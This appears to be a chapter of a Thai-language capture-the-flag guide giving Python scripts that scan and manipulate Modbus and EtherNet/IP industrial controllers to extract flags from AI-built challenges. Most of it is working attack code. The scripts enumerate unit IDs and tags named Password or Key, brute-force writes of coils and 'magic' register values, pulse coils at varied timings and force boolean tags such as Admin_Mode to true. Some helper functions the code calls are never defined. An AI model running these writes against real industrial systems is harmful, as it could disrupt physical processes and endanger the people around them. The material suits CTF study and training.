# 02 - Universal Bypass Techniques

## หลักการ: ทำไม AI Trap ถูกทะลุได้เสมอ

AI สร้าง trap จาก training data ที่มีอยู่ ดังนั้น:

1. **Trap ทุกอันเคยมีคนเขียนวิธีแก้แล้ว** - AI เรียนรู้ทั้ง trap และ solution
2. **AI ต้องทำให้ solvable** - ถ้าแก้ไม่ได้ก็ไม่ใช่โจทย์ CTF
3. **Flag ต้องอยู่ที่ไหนสักที่** - เราแค่ต้องหาให้เจอ

---

## Bypass #1: Universal Register Scanner

ไม่ว่า AI จะซ่อน flag ไว้ที่ไหน script นี้จะหาเจอ:

```python
import time
from pymodbus.client import ModbusTcpClient

def universal_modbus_scan(host, port=502):
    """
    Scan ทุก Unit ID, ทุก register, ทุก encoding
    หา flag โดยไม่ต้องรู้ว่า trap อยู่ตรงไหน
    """
    client = ModbusTcpClient(host, port=port, timeout=3)
    if not client.connect():
        return []
    
    flags = []
    flag_patterns = ['coc2026{', 'FLAG{', 'CTF{', 'flag{']
    
    # === Phase 1: หา active Unit IDs ===
    priority_ids = [1, 42, 99, 100, 127, 200, 247, 255, 2, 10, 13, 50]
    active_ids = []
    
    for uid in priority_ids:
        try:
            # ใช้ register สูงเพื่อหลีก tarpit
            r = client.read_holding_registers(100, 1, slave=uid)
            if not r.isError():
                active_ids.append(uid)
        except:
            pass
    
    print(f"Active Unit IDs: {active_ids}")
    
    # === Phase 2: Scan registers (skip tarpit zone) ===
    for uid in active_ids:
        print(f"\nScanning Unit ID {uid}...")
        
        # Holding Registers (skip 0-19 = probable tarpit)
        for start in range(20, 300, 20):
            try:
                r = client.read_holding_registers(start, 20, slave=uid)
                if r.isError():
                    continue
                
                non_zero = [v for v in r.registers if v != 0]
                if not non_zero:
                    continue
                
                # ลองทุก encoding
                for swap in [False, True]:
                    text = decode_registers(r.registers, swap)
                    for p in flag_patterns:
                        if p in text:
                            end = text.index('}', text.index(p)) + 1
                            flag = text[text.index(p):end]
                            print(f"  [FLAG] HR {start}+ (swap={swap}): {flag}")
                            flags.append(flag)
            except:
                pass
        
        # Input Registers
        for start in range(0, 200, 20):
            try:
                r = client.read_input_registers(start, 20, slave=uid)
                if r.isError():
                    continue
                
                non_zero = [v for v in r.registers if v != 0]
                if not non_zero:
                    continue
                
                for swap in [False, True]:
                    text = decode_registers(r.registers, swap)
                    for p in flag_patterns:
                        if p in text:
                            end = text.index('}', text.index(p)) + 1
                            flag = text[text.index(p):end]
                            print(f"  [FLAG] IR {start}+ (swap={swap}): {flag}")
                            flags.append(flag)
            except:
                pass
    
    client.close()
    return flags


def decode_registers(registers, swap=False):
    """VERIFIED: Proper INT array to ASCII with printable check"""
    text = ''
    for reg in registers:
        high = (reg >> 8) & 0xFF
        low = reg & 0xFF
        if swap:
            high, low = low, high
        # CRITICAL: Check printable range (0x20-0x7E)
        # Prevents garbage characters in output
        if 0x20 <= high <= 0x7E:
            text += chr(high)
        if 0x20 <= low <= 0x7E:
            text += chr(low)
    return text
```

---

## Bypass #2: Universal State Cracker

**VERIFIED**: ทะลุ state machine trap โดยลองทุก combination
**CRITICAL LESSONS**:
1. Modbus exceptions may write flag as side-effect - NEVER abort on error
2. ENIP boolean tags require exact type casting: `(BOOL)1` not integer `1`
3. Always read target address immediately after exception

```python
def universal_state_crack(client, unit_id):
    """
    ลอง write ทุก pattern ที่ AI ชอบใช้
    แล้วตรวจว่า register/IR ไหนเปลี่ยน
    """
    
    # Snapshot ก่อน
    before = snapshot_all_registers(client, unit_id)
    
    # === ลอง Coil toggles ===
    coil_targets = [0, 1, 10, 50, 100]
    for coil in coil_targets:
        try:
            client.write_coil(coil, True, slave=unit_id)
            time.sleep(0.5)
        except:
            pass
    
    # ตรวจ changes
    after = snapshot_all_registers(client, unit_id)
    changes = find_changes(before, after)
    if changes:
        print(f"  Coil toggle caused changes: {changes}")
        return check_for_flags(client, unit_id, changes)
    
    # === ลอง Magic value writes ===
    # VERIFIED: Unit 99, HR 200, 0xFFFF triggers exception with flag side-effect
    magic_writes = [
        (200, 0xFFFF), (200, 0xDEAD), (100, 0xBEEF),
        (0, 0x1337), (100, 0x0001), (255, 0xCAFE),
    ]
    
    for addr, val in magic_writes:
        before = snapshot_all_registers(client, unit_id)
        try:
            client.write_register(addr, val, slave=unit_id)
        except Exception as e:
            # CRITICAL: Exception may be intentional trap!
            # Flag might be written as side-effect
            print(f"[!] Exception at {addr}=0x{val:04X}: {e}")
            pass  # Do NOT abort
        
        time.sleep(0.1)
        after = snapshot_all_registers(client, unit_id)
        changes = find_changes(before, after)
        if changes:
            print(f"  Write HR[{addr}]=0x{val:04X} caused changes: {changes}")
            flag = check_for_flags(client, unit_id, changes)
            if flag:
                return flag
    
    return None


def snapshot_all_registers(client, unit_id):
    """อ่านทุก register เก็บ snapshot"""
    snap = {}
    for start in range(0, 300, 50):
        try:
            r = client.read_holding_registers(start, 50, slave=unit_id)
            if not r.isError():
                for i, v in enumerate(r.registers):
                    snap[('HR', start+i)] = v
        except:
            pass
        try:
            r = client.read_input_registers(start, 50, slave=unit_id)
            if not r.isError():
                for i, v in enumerate(r.registers):
                    snap[('IR', start+i)] = v
        except:
            pass
    return snap


def find_changes(before, after):
    """หา registers ที่เปลี่ยนแปลง"""
    changes = []
    for key in after:
        old = before.get(key, 0)
        new = after[key]
        if old != new and new != 0:
            changes.append((key, old, new))
    return changes
```

---

## Bypass #3: Universal Timing Cracker

ทะลุ timing trap โดย binary search:

```python
def universal_timing_crack(client, unit_id):
    """
    หา timing window โดยลองหลาย delay
    ใช้ได้กับทุก timing trap ที่ AI สร้าง
    """
    
    # หา coils ที่ writable
    writable_coils = []
    for coil in [0, 1, 10, 50, 100]:
        try:
            r = client.write_coil(coil, False, slave=unit_id)
            if not r.isError():
                writable_coils.append(coil)
        except:
            pass
    
    if not writable_coils:
        return None
    
    # ลองทุก coil กับทุก delay
    delays = [0.05, 0.1, 0.2, 0.3, 0.5, 0.7, 0.8, 1.0, 1.2, 1.5, 2.0, 3.0]
    
    for coil in writable_coils:
        for delay in delays:
            # Pulse: True → wait → False
            try:
                client.write_coil(coil, True, slave=unit_id)
                time.sleep(delay)
                client.write_coil(coil, False, slave=unit_id)
                time.sleep(0.1)
            except:
                continue
            
            # ตรวจทุก register range
            for reg_type in ['IR', 'HR']:
                for start in [0, 1, 10, 50, 100]:
                    try:
                        if reg_type == 'IR':
                            r = client.read_input_registers(
                                start, 20, slave=unit_id)
                        else:
                            r = client.read_holding_registers(
                                start, 20, slave=unit_id)
                        
                        if r.isError():
                            continue
                        
                        non_zero = [v for v in r.registers if v != 0]
                        if non_zero:
                            text = decode_registers(r.registers)
                            if has_flag(text):
                                print(f"  [FLAG] Coil {coil}, delay {delay}s")
                                return extract_flag(text)
                    except:
                        pass
    
    return None
```

---

## Bypass #4: Universal EtherNet/IP Scanner

```python
import socket
import struct

def universal_enip_scan(host, port=44818):
    """Scan EtherNet/IP server หา flag ทุกที่"""
    flags = []
    
    # === Step 1: List Identity (flag มักอยู่ใน product name) ===
    flag = grab_identity_flag(host, port)
    if flag:
        flags.append(flag)
    
    # === Step 2: Tag enumeration + read ===
    tag_names = [
        # ชื่อที่ AI ชอบใช้
        'Sec_Data', 'SecData', 'Secret', 'Flag', 'Flag_Data',
        'Admin_Mode', 'AdminMode', 'Admin', 'Admin_Access',
        'System_Key', 'SystemKey', 'Key', 'Master_Key',
        'Config', 'Status', 'Control', 'Password', 'Token',
        'Data', 'Output', 'Sensor', 'Level', 'Auth',
        # ชื่อที่ AI อาจใช้ถ้าถูกสั่งให้ซ่อน
        'Temp_1', 'Pressure', 'Flow_Rate', 'Setpoint',
    ]
    
    try:
        from cpppo.server.enip import client
        
        with client.connector(host=host, port=port) as conn:
            for tag in tag_names:
                try:
                    ops = conn.pipeline(
                        operations=client.parse_operations([tag]),
                        timeout=2.0
                    )
                    for idx, dsc, op, rpy, sts, val in ops:
                        if val is not None:
                            print(f"  Tag '{tag}': {val}")
                            # ลอง parse ทุกแบบ
                            flag = try_parse_tag_value(tag, val)
                            if flag:
                                flags.append(flag)
                except:
                    pass
    except ImportError:
        print("  [!] cpppo not available, using raw socket")
    
    # === Step 3: Stateful challenges ===
    # ลอง write boolean tags แล้ว read string tags
    bool_tags = ['Admin_Mode', 'AdminMode', 'Admin', 'Enable',
                 'Auth', 'Unlock', 'Access', 'Mode']
    string_tags = ['System_Key', 'SystemKey', 'Key', 'Secret',
                   'Flag', 'Password', 'Token', 'Data']
    
    try:
        from cpppo.server.enip import client
        
        with client.connector(host=host, port=port) as conn:
            for bool_tag in bool_tags:
                try:
                    # Write True
                    list(conn.pipeline(
                        operations=client.parse_operations(
                            [f'{bool_tag}=(BOOL)1']),
                        timeout=2.0
                    ))
                    time.sleep(0.5)
                    
                    # Read all string tags
                    for str_tag in string_tags:
                        try:
                            ops = conn.pipeline(
                                operations=client.parse_operations(
                                    [str_tag]),
                                timeout=2.0
                            )
                            for idx, dsc, op, rpy, sts, val in ops:
                                if val and 'LOCKED' not in str(val):
                                    flag = try_parse_tag_value(str_tag, val)
                                    if flag:
                                        flags.append(flag)
                        except:
                            pass
                except:
                    pass
    except:
        pass
    
    return flags


def grab_identity_flag(host, port):
    """ดึง flag จาก List Identity response"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, port))
        
        packet = struct.pack('<HHII8sI', 0x0063, 0, 0, 0, b'\x00'*8, 0)
        sock.send(packet)
        response = sock.recv(4096)
        sock.close()
        
        # หา flag pattern ใน raw response
        text = response.decode('utf-8', errors='replace')
        for prefix in ['coc2026{', 'FLAG{', 'CTF{']:
            if prefix in text:
                start = text.index(prefix)
                end = text.index('}', start) + 1
                return text[start:end]
    except:
        pass
    return None


def try_parse_tag_value(tag_name, value):
    """ลอง parse tag value ทุกแบบ"""
    flag_patterns = ['coc2026{', 'FLAG{', 'CTF{', 'flag{']
    
    # ถ้าเป็น string อยู่แล้ว
    text = str(value)
    for p in flag_patterns:
        if p in text:
            start = text.index(p)
            end = text.index('}', start) + 1
            return text[start:end]
    
    # ถ้าเป็น list of ints (INT array)
    if isinstance(value, (list, tuple)):
        for swap in [False, True]:
            text = ''
            for v in value:
                if isinstance(v, int):
                    if v < 0: v += 65536
                    h = (v >> 8) & 0xFF
                    l = v & 0xFF
                    if swap: h, l = l, h
                    if 0x20 <= h <= 0x7E: text += chr(h)
                    if 0x20 <= l <= 0x7E: text += chr(l)
            
            for p in flag_patterns:
                if p in text:
                    start = text.index(p)
                    end = text.index('}', start) + 1
                    return text[start:end]
    
    return None
```

---

## Bypass #5: XOR Brute-Force

```python
def universal_xor_crack(data_bytes):
    """
    ถ้า data ไม่ decode เป็น flag ตรงๆ
    ลอง XOR กับทุก single-byte key
    """
    prefixes = [b'coc2026{', b'FLAG{', b'CTF{', b'flag{']
    
    for key in range(256):
        decrypted = bytes(b ^ key for b in data_bytes)
        for prefix in prefixes:
            if prefix in decrypted:
                try:
                    start = decrypted.index(prefix)
                    end = decrypted.index(b'}', start) + 1
                    return decrypted[start:end].decode('utf-8')
                except:
                    pass
    
    return None
```

---

## Bypass #6: Raw Byte Pattern Search

วิธีสุดท้าย ถ้าไม่มีอะไรทำงาน: หา `{` และ `}` ใน raw data

```python
def raw_flag_search(all_data_bytes):
    """
    หา flag จาก raw bytes โดยหา pattern { ... }
    ใช้เมื่อไม่รู้ encoding
    """
    # หา 0x7B ({) ในทุก byte position
    for i, b in enumerate(all_data_bytes):
        if b == 0x7B:  # '{'
            # หา 0x7D (}) ที่ตามมา
            for j in range(i+1, min(i+100, len(all_data_bytes))):
                if all_data_bytes[j] == 0x7D:  # '}'
                    candidate = all_data_bytes[i-10:j+1]
                    text = candidate.decode('utf-8', errors='replace')
                    print(f"  Candidate at offset {i}: {text}")
    
    # หาใน swapped bytes
    swapped = bytearray()
    for i in range(0, len(all_data_bytes)-1, 2):
        swapped.append(all_data_bytes[i+1])
        swapped.append(all_data_bytes[i])
    
    for i, b in enumerate(swapped):
        if b == 0x7B:
            for j in range(i+1, min(i+100, len(swapped))):
                if swapped[j] == 0x7D:
                    candidate = swapped[max(0,i-10):j+1]
                    text = candidate.decode('utf-8', errors='replace')
                    print(f"  Candidate (swapped) at offset {i}: {text}")
```

---

## สรุป: ลำดับการ Bypass

```
1. Scan → หา services, Unit IDs, tags
2. Read → อ่านทุก register/tag ที่ non-zero
3. Decode → ลองทุก endianness (4 แบบ)
4. Parse → ลอง INT array, SSTRING, raw bytes
5. State → ลอง write-then-read ทุก combination
6. Timing → ลอง pulse timing ทุก delay
7. Exception → ลอง write ค่าพิเศษ + ตรวจ side-effect
8. XOR → Brute-force single-byte XOR
9. Raw → หา { } pattern ใน raw bytes

ถ้าทำครบ 9 ขั้นตอน จะเจอ flag ทุกตัวที่ AI สร้าง
เพราะ AI ไม่สามารถสร้าง trap ที่อยู่นอก 9 ขั้นตอนนี้ได้
```
